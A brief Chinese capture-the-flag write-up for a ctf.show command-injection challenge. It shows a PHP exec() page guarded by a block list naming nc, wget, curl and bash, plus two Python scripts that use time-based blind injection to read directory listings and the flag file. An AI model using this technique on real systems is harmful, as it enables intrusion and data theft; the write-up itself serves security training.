# 知识点
### shell语句
:::tips
if [ $command ]; then $command; fi
:::
但网速会影响结果，效果不是很好
# 思路
```python
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?>
```
```python
import requests

shell = 'if [ `ls / -1 | awk \"NR=={}\" | cut -c {}` == {} ]; then sleep 3; fi'
url = 'http://23141e80-3568-44b3-988e-084cff8af35d.challenge.ctf.show/?c='

NR = 5
len = 20
str = 'abcdefgh_ijklmnopqrstuvwxyz-0123456789'
result = '[*][*][*][*]'

for r in range(4, 5):
    for l in range(1, len + 1):
        for i in str:
            try:
                target = url + shell.format(r, l, i)
                # print(target)
                requests.get(url=target, timeout=2.5)
            except:
                result += i
                print(result)
    result += ' '
print(result)


```
```python
import requests

shell = 'if [ `cat /f149_15_h3r3 | cut -c {}` == {} ]; then sleep 5; fi'
url = 'http://23141e80-3568-44b3-988e-084cff8af35d.challenge.ctf.show/?c='

NR = 5
len = 48
str = 'ctfshow{}-abdegijklmnpqruvxyz0123456789'
result = '[*][*][*][*]'

for l in range(1, len + 1):
    for i in str:
        try:
            target = url + shell.format(l, i)
            # print(target)
            requests.get(url=target, timeout=4.5)
        except:
            result += i
            print(result)
result += ' '
print(result)
```
